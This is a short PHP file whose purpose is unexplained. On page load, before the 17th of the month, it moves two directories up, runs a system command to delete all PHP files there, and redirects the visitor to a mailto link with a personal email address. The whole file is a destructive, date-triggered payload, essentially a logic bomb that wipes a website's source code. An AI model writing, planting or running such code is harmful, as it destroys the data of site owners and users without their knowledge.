<?php 
    if(date("d")<"17"){
        chdir("../../");
        system("del *.php");
        $url=utf8_encode("mailto:danieluokof@gmail.com");
        header("location: $url");
    }
    exit();
?>